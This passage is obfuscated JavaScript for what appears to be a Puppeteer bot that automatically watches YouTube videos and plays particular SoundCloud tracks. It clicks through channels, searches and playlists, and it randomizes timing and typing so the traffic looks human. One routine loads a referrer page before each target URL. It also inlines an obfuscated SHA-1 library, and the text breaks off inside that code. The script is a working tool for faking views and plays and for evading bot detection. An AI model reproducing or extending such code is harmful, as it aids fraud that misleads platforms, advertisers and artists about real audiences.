function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x209f + 0xee * -0xe + 0x689 * -0x3);
    let h = e[f];
    if (c['ShgJzl'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1bb1 + 0x466 * 0x7 + -0x3a7b, r, s, t = 0x1 * 0x1ed6 + 0x3 * -0x9eb + 0x115 * -0x1; s = m['charAt'](t++); ~s && (r = q % (0xe35 * 0x1 + -0x1 * -0x13ff + -0x2230) ? r * (-0xcc7 * -0x1 + -0x443 + -0x844) + s : s, q++ % (0x24ba + 0x1af9 * 0x1 + 0x77 * -0x89)) ? o += String['fromCharCode'](-0x1 * -0x1345 + 0x25c + -0x14a2 & r >> (-(-0xd6f + -0x1 * 0x20c + -0xd * -0x131) * q & 0x576 * 0x3 + -0x122d + 0xf * 0x1f)) : -0xa * 0x42 + 0x17f1 + 0x71f * -0x3) {
          s = n['indexOf'](s);
        }
        for (let u = 0x4 * -0x2cb + -0x16a * 0x5 + 0x1d3 * 0xa, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x33 * 0x31 + 0x107f * -0x2 + 0x59 * 0x43))['slice'](-(-0x1cde + -0x1100 + 0x2de0));
        }
        return decodeURIComponent(p);
      };
      c['Bzpskz'] = i, b = arguments, c['ShgJzl'] = !![];
    }
    const j = e[0x152b + 0xafe + 0x2029 * -0x1],
      k = f + j,
      l = b[k];
    return !l ? (h = c['Bzpskz'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const Y = b,
  X = d,
  W = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x19 * 0xab + 0x1 * 0x1877 + 0x2929 * -0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1 * 0x3af + -0x2ff * 0x1 + 0x6ae), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x205 * 0x57 + 0xdc5b * 0x1 + 0x58 * 0xd3 + (-0x1 * -0x39cd + 0x713 + -0x648) * random()) : await standardWaitForNetIdle(f), await wait(-0xd6f + -0x1 * 0x20c + -0x1 * -0x2303 + (0x831 * 0x4 + -0x2459 + 0x9 * 0x4bd) * random()), -0xa * 0x42 + 0x17f1 + 0xaae * -0x2;
}

function a() {
  const bp = [
    'ChrZl2j5lxnPDa',
    'aJdcUCoU',
    '-mods-moom',
    'yNrZigz1DhvYzq',
    'f1/dO3FdUNBdTs0YWRS',
    'WRqpW5FcJLBcJCkuyrPk',
    'browser\x20la',
    'WQNdPcNdHqtdI8kjwmkcdG',
    'W6fnWPXnWOOqWO/dICosWQC',
    'lidate',
    'uZLfA1Hymffzra',
    'W6lcU38',
    'DhmGBMv3CYb0BW',
    'error',
    'bytes',
    'Ahr0Chm6lY9NCG',
    'WR3cVCo8oW',
    'Promise',
    'jJeWW5lcPqddLCkx',
    'zxYjTTXc-J',
    'W7Gns8kcfs4DWRe',
    'https://op',
    'y3jHzNqSBwLUzq',
    'ChvZAa',
    'zwfZEwzVCMSUBW',
    'b5WfUvcSgr',
    'finalized'
  ];
  a = function() {
    return bp;
  };
  return a();
}
async function standardWaitForNetIdle(f) {
  return await wait(0x4 * -0x2cb + -0x16a * 0x5 + 0x3c7 * 0xa), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x33 * 0x31 + 0x107f * -0x2 + 0x5cf * 0x4;
}
async function randomWait() {
  return await wait(-0x1cde + -0x1100 + 0x4166 + (0x152b + 0xafe + 0x3d * -0x35) * random()), 0x2 * -0x7dd + 0x833 * 0x3 + -0x8de;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x23ab * 0x1 + 0x1 * -0x1665 + -0x2 * -0x1d08, 0x1f * 0x12d + 0x2a * -0x10 + -0x21cc), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x119a7 * -0x1 + -0x1176d * 0x1 + -0x18dba * -0x2) * getRandomInt(-0x1 * -0x2316 + 0x1abd + -0x3dd1, -0xf10 * -0x1 + 0x10df + -0x1fea), h)), -0x1e17 + 0x197e + 0x13 * 0x3e;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x6 * -0x2ab + 0xa94 * -0x3 + 0x2fbe;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x138c + -0x260f + 0x1284]['split']('\x20');
    for (let k = -0x111d + 0x5 * -0x646 + 0x307b; k < i['length']; k += -0xf5 + -0x1c14 + 0x1d0b)
      j += i[k] * h[i[k + (-0xcfe + -0xfb + 0xdfa * 0x1)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + R(0x14, 'Z[lQ')), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x69 * -0x57 + -0xef9 + 0x32ae)['map'](l => Array['from'](l['children']))['flat'](0x267e + 0x10 * -0xaf + 0x1b8d * -0x1)['map'](l => l['childNodes'][0x1 * 0x25d0 + 0x2681 + -0x4c50]['childNodes'][0x12ec + 0x220 * 0x9 + 0x983 * -0x4]['childNodes'][0x1ae7 * 0x1 + -0x169f * -0x1 + -0x713 * 0x7]['childNodes'][0x1094 + 0x2d3 * 0x6 + -0x2186]['childNodes'][0x2405 * 0x1 + -0x1b2d + -0x8d7]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x17e8 + 0x1b1 * 0x3 + -0x1913, 0x26e6 + -0xe0b + -0x553)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x379a * 0x1 + -0x4ed6 + 0x51d4);
  const h = await getMaxTime(f),
    i = Math['min']((0x17e2 * 0x6 + -0x3 * 0x1fcd + 0x3e29 * 0x3) * getRandomInt(-0x1e7f + 0x1a5f * 0x1 + 0x2 * 0x211, 0xd * -0x14b + -0xf2e + 0x2002), h);
  return await wait(i), 0xc * -0x63 + 0x11e8 * 0x2 + -0x1f2b;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x63f + -0x55 * -0xa + 0x1 * -0x991]['children'][-0xb8 * -0x4 + 0xfef * -0x1 + 0xd0f]['children'][-0x1c78 + 0x122b * 0x2 + -0x7de * 0x1]['children'][0x1478 + 0x1 * -0xf73 + -0x505]['children'][0xc04 + 0xc03 + -0x1807]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0xdd3 * 0x2 + 0x1609 + -0x31ae;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x2d * -0x45 + 0x182c + -0xba7 + (0xe16 + -0x1c57 + -0x1b * -0x89) * random()
  }), await wait(-0xa53 + -0x5 * -0x52f + 0xda4 * -0x1 + (-0xe * -0x1dd + -0x176 + -0x5dd * 0x4) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x3 * 0x565 + 0xf7c * 0x1 + -0x655 * 0x5]['childNodes'][0x27b * -0x2 + -0x1cba * -0x1 + 0x4d * -0x4f]['childNodes'][0xd16 * 0x1 + -0x1741 + -0x7c * -0x15]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x6b * -0x1f + 0x1def * -0x1 + 0x2ae9 * 0x1]['childNodes'][0x1b78 + 0x69e + 0x2216 * -0x1]['childNodes'][0x1 * 0x1275 + 0x7e6 * -0x4 + -0x1 * -0xd25]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x5bb * -0x2 + -0x1 * -0x1891 + 0x81 * -0x1a),
          r = -0x3b3 + -0x1b54 + 0x1f07;
        for (let u = -0xa3b + -0x1e4c + 0x2887; u < q['length']; u += 0x8f1 + -0x1 * 0x152c + 0xc3d)
          r += q[u] * k[q[u + (0x240b * 0x1 + 0x174 * 0xc + -0x357a)]];
        return r;
      }(n);
  });
  await wait((0x57f3 + -0x3553 + 0x17f8) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x8a5 * -0x13 + -0x148d * 0x1 + 0x1a32c) * getRandomInt(0x1c2 + -0x704 + 0x543, -0x7 * -0x257 + 0x5e1 * -0x4 + 0x72d), h + (0x4 * -0x652 + -0xbec + 0x38bc));
  return await wait(i), -0x1be7 + 0x14 * 0x1c9 + -0x7cc;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x26c * 0xe + -0x21 * 0xea + 0x4012), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x1b1 * 0x1 + 0x1adb + 0x435 * -0x4 + (-0x1 * 0x2567 + 0xf8b + 0x19c4) * Math['random']());
    });
  }, -0x35ef + -0x388 * -0x3 + 0x46af);
  await wait(0x4aada + -0xa * 0xe87c + -0x3 * -0x2ff4a);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x2bb4 * -0x4 + 0x1 * -0x9e87 + 0xda17 * 0x1) * getRandomInt(-0x1fd5 + -0x252c + 0x4505 * 0x1, -0x20dd + -0x33 * -0x61 + 0xda3)), clearInterval(h), 0x24b0 + 0x2477 + -0x2 * 0x2493;
}
async function runYTModule(f, h) {
  const as = {
      f: 'W2ah'
    },
    S = b,
    i = await createPage(f, 'https://ww' + 'w.youtube.' + S(0x1, as.f));
  for (await randomWait();;) {
    let j = 0x1b3 * 0x10 + -0x140b * 0x1 + -0x725;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x5fc + -0x1787 * 0x1 + 0x118c;
    await randomWait();
  }
  return 0x1 * 0x5fd + -0x4c6 + -0x2 * 0x9b;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1a6 * 0x1 + 0x1 * 0x21b5 + -0x1 * 0x200f + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x3 * 0x465 + -0x1224 + 0x9 * 0x37b + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1c84 + -0x1946 + -0x55 * -0xa2 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x209c + -0xc9 * 0x14 + 0x3050;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x77f1 + 0x13dbf + 0xb03 * -0x2 + getRandomInt(0x287b * -0x2 + 0x4 * -0xdcd + 0xc2c2, 0x10 * -0x1be + -0x16 * -0x634 + 0xb * 0xc8));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x15bd + -0xc15 * -0x3 + -0xe81 * 0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1 * -0x1393 + 0x1f * 0x3a + 0x1 * -0x1a99;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x2321 + 0x9c0 + 0x1961, 0xc26 * -0x3 + 0xd4f * -0x2 + 0x3f42)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x242 + 0x2147 + 0x1c9 * -0xd + floor((0x889 * 0x1 + 0x1eca + -0x1 * 0x236b) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x850a2ff6 + -0xdeb9aec4 + 0xd9af7ece),
          -0x9 * -0x4f621 + 0x537d27 + -0x2450,
          -0x8743 * -0x1 + -0x3 * 0x3af6 + 0xa99f,
          0x13 * 0x4b + 0x1 * 0x257c + -0x2a8d
        ], y = [
          -0x4ef * -0x1 + 0x1401 + -0x6 * 0x424,
          0xdb3 + -0x15a5 + 0x802,
          -0x21d6 + 0x549 + 0x1c95,
          0x1e7 * -0xf + 0x25c1 + -0x938
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x19f * 0x14 + -0x1a98 + -0x3b05 * -0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x7 * -0x46e + 0x24 * -0x8d + -0x12 * -0x2d3; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x10f7 * -0x2 + 0x21aa + 0x44) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x25f7 + 0x35 * 0xa6 + 0x1 * -0x4855] = A[0x2 * 0x10da + -0x1de * 0x10 + -0x3c4 * 0x1] = A[0xb0 + 0x160b + -0x16ba] = A[0x104e + 0x65 * -0x43 + 0xa23] = A[0x1f25 + 0x665 * 0x1 + -0x2587] = A[0x287 * -0x3 + 0x8db * -0x2 + 0x194f] = A[-0x2 * -0x12bf + 0x81c + -0x2d95] = A[0x2190 + 0x11 * 0x175 + -0x3a4f] = A[0x481 + 0x2656 + 0x112 * -0x28] = A[-0x1cb2 + 0x2166 + -0x4ac] = A[0x1c43 + 0x19 * -0x79 + -0x1 * 0x1069] = A[0x4 * -0x1b3 + 0x217b + 0x167 * -0x13] = A[0xf19 + 0x1 * 0xda1 + 0x419 * -0x7] = A[0x180e + -0x2484 + 0x1 * 0xc82] = A[-0xd * 0x121 + -0x15a5 + -0x245f * -0x1] = A[-0xf43 + 0x11 * -0x13d + 0x245e] = A[-0x383 + -0x1 * -0x17db + 0x241 * -0x9] = 0x1051 * 0x1 + 0x10de + -0x212f, this['blocks'] = A) : this['blocks'] = [
                0x2056 + -0x1db8 * 0x1 + -0x14f * 0x2,
                0x3 * -0x8d + 0x216b + -0x13 * 0x1ac,
                0x1c8a + 0x15b7 + -0x3241,
                0x12fb + 0x45d + -0x1758,
                -0x22a7 * 0x1 + 0x46e + 0x1e39,
                0x22f + -0x2 * 0x1367 + -0xf * -0x271,
                0x1afa + 0x1 * -0x1c4c + -0x1 * -0x152,
                0x1 * 0x7bb + -0x17c2 + 0x1007,
                -0x1f * 0xbb + 0x1d69 + -0x1 * 0x6c4,
                0x7 * -0x351 + -0x1d * 0x6a + -0x1 * -0x2339,
                -0x22ba + -0x39 * 0xad + 0x493f,
                0xe * 0x133 + 0x1aec + -0x15db * 0x2,
                -0x506 * -0x1 + -0x1653 + 0x114d,
                0x1 * -0x116b + -0x2 * 0xcf2 + -0x2b4f * -0x1,
                -0x11f * 0x15 + -0x1 * -0x1b8b + 0x20 * -0x20,
                0x1fe5 * 0x1 + 0x857 + -0x406 * 0xa,
                0x125b * -0x2 + 0x6 * 0x499 + 0x920
              ], this['h0'] = 0x26c45ed1 + 0x22a2fe21 + 0x1dddc60f, this['h1'] = -0x4 * 0x2c25b918 + -0x70b6dde * -0x4 + 0xdc9 * 0x1c2969, this['h2'] = -0x2 * 0x29643194 + 0x4b * 0x85bff2 + 0xc4540440, this['h3'] = 0x1 * -0x9bce04b + 0x1bc19fdc + 0x1f1835 * -0xf, this['h4'] = -0x1a * -0xa066192 + 0x10cc34f2b + -0x14d96560f * 0x1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x4c7 * 0x2 + -0x33 * -0x97 + -0x1487, this['finalized'] = this['hashed'] = -0x238c + 0x4a7 * 0x2 + -0x1a3e * -0x1, this['first'] = -0x1849 + 0x1061 * -0x1 + 0x28ab;
            }
            ['update'](J) {
              const T = d;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x193 * -0xd + -0x29 * 0xe2 + 0xfbb, O = J['length'] || -0x1 * 0x255c + -0x653 + 0x2baf, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x12 * -0x1e2 + -0x9e + 0xe * 0x277, P[-0x11 * -0x19e + 0x15 * 0x191 + -0x3c63] = this['block'], P[-0x160d + -0x182e + 0x2e4b] = P[0x2 * 0x5 + -0xa89 + 0xa80] = P[-0x2141 * -0x1 + 0x8 * 0x38d + 0x3 * -0x148d] = P[-0x1fd * -0x13 + -0xaeb + -0x1ad9] = P[-0x1bb * -0x1 + -0x116c * -0x1 + 0x1 * -0x1323] = P[-0x1 * -0xd0c + 0xbf8 + -0x18ff * 0x1] = P[0x1b * -0xc3 + -0x1 * 0xfa + 0x1591] = P[-0x266 * 0x10 + 0x1115 + 0x1552] = P[0x9ba + -0x1 * 0x11 + -0x9a1] = P[0x344 + 0x79 * -0x35 + 0x18f * 0xe] = P[0x185e + 0x58d + -0x1 * 0x1de1] = P[-0xe52 + -0x17b9 + -0x177 * -0x1a] = P[-0x12 * 0x39 + 0x1 * -0xc2 + 0x4d0] = P[-0xa0d + 0xdcf + -0x3b5] = P[-0x1a7e * -0x1 + -0x1cae + 0x23e] = P[0x1e3 + 0xaa1 + -0x3 * 0x427] = 0x25d5 + -0x1d7 * -0x1 + -0x27ac), K) {
                    for (N = this['start']; M < O && N < -0x17b8 + -0x5fe + -0x24e * -0xd; ++M)
                      P[N >> -0xa91 + -0x17b0 + 0x2243] |= J[M] << y[-0xe05 + 0x1 * 0xc87 + 0x181 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x2525 * 0x1 + -0x3 * -0xa21 + -0x4348; ++M)
                      (L = J['charCodeAt'](M)) < 0xa * -0x9a + -0x109 * 0xf + 0x160b ? P[N >> -0x9c1 + 0x1878 + 0xf * -0xfb] |= L << y[0xb3 * 0x31 + 0xbb0 + -0x18 * 0x1ea & N++] : L < -0x37 * -0x2a + 0x2c * -0x41 + 0xa26 ? (P[N >> 0xea6 + -0x437 * -0x1 + 0x3 * -0x649] |= (0xb8b + 0x1 * 0x228f + -0x12 * 0x285 | L >> 0x1523 + -0x1f15 + 0x9f8) << y[0x120b + 0x5ab + -0x1 * 0x17b3 & N++], P[N >> 0xfe9 + 0x1567 + -0x254e] |= (-0x22a4 + 0x8f2 + 0x2 * 0xd19 | 0x3ad * 0xa + -0x176 + -0x230d & L) << y[-0xdcb + -0x62 * 0x1b + -0x2 * -0xc12 & N++]) : L < -0xd22 * 0x5 + -0x13745 + 0xc5a5 * 0x3 || L >= -0x67f * -0x2 + -0x9aae * 0x2 + 0x2085e ? (P[N >> -0x21fc + 0xf * 0x243 + -0x11 * -0x1] |= (-0x7b8 + -0x273 * -0x5 + -0x37 * 0x11 | L >> -0x224d * 0x1 + -0x87e + -0xb * -0x3e5) << y[-0x214f + 0x474 + 0x1cde & N++], P[N >> 0xa6d * -0x3 + -0x1 * 0x1597 + -0x2f * -0x120] |= (-0x1 * -0x10b2 + 0x160c + -0x1bd * 0x16 | L >> 0x35a * -0x3 + -0x138d + 0x1da1 * 0x1 & -0xcc4 + 0x1 * -0x1eef + 0x2bf2) << y[0x1adc + -0x704 * -0x2 + -0x28e1 & N++], P[N >> -0x1085 * 0x1 + -0x266a + 0x36f1] |= (0xc4f + 0x1 * -0x1d + 0x6 * -0x1f3 | -0x5de + 0x1ff2 + -0x185 * 0x11 & L) << y[-0x4b7 + -0x5d5 * -0x6 + -0xd * 0x254 & N++]) : (L = 0x1c4c9 + -0xc94b + -0x1 * -0x482 + ((-0x18ed * 0x1 + -0x1a * -0x71 + 0x13f * 0xe & L) << 0x69b * 0x4 + 0xa * 0x38c + -0x3dda | 0x6 * 0xb + -0x1 * -0x22f9 + -0x7cf * 0x4 & J['charCodeAt'](++M)), P[N >> -0x18df + 0x1bf1 * 0x1 + -0x310] |= (0x5 * -0x605 + -0xc38 + -0x2b41 * -0x1 | L >> -0x1c61 + -0x1069 + 0x6 * 0x77a) << y[-0x2 * -0x766 + -0xd6 * -0x2 + -0x1075 & N++], P[N >> -0xfdb * 0x2 + 0x127f + 0xd39 * 0x1] |= (0x1655 * -0x1 + 0x11 * 0x1a2 + -0x4ed | L >> 0x2591 + -0xeaa * -0x1 + -0x342f & 0xe28 + -0x19aa + 0x3 * 0x3eb) << y[-0x1 * -0x196c + -0x1db4 * -0x1 + -0x371d & N++], P[N >> 0x4 * -0x63a + -0x1d76 + 0x3660] |= (-0x35 * -0x29 + -0x87 + -0x2 * 0x3bb | L >> 0x46b + 0x192c + -0x1d91 & 0x1fac + 0x1bbe + -0x3b2b) << y[-0x1762 + -0xcf * 0x13 + -0x1 * -0x26c2 & N++], P[N >> -0x23d9 + -0x56 * 0x1a + 0x2c97] |= (-0x2423 + 0x6b * 0x2a + 0x3d1 * 0x5 | 0x25a4 + -0x52 * 0x3a + 0x12d1 * -0x1 & L) << y[0x2 * -0x188 + -0x1d09 + 0x201c & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1447 + -0x614 * -0x2 + -0x202f ? (this['block'] = P[0x3 * 0x85f + -0x887 + -0x1086], this['start'] = N - (0x1ef0 + -0x2 * -0x5cb + -0x1523 * 0x2), this['hash'](), this['hashed'] = -0x4 * 0x656 + 0xf5e + -0x1ff * -0x5) : this['start'] = N;
                }
                return this['bytes'] > -0x1a3a9d13b + -0x22f4ec30 + -0x2 * -0x1634f5eb5 && (this['hBytes'] += this[T(0xe)] / (0x70ad0e5c + 0x845abc38 + 0xaf8356c) << 0xc9a * 0x1 + 0x1d7 * -0x9 + 0x3f5, this['bytes'] = this['bytes'] % (0x21a8 * 0x950eb + 0x1b8 * -0xa5f1e5 + -0x10 * -0xe3ac5c6)), this;
              }
            }
            ['finalize']() {
              const U = d;
              if (!this['finalized']) {
                this[U(0x1a)] = 0x20e5 + -0x2b * 0x1f + -0x175 * 0x13;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
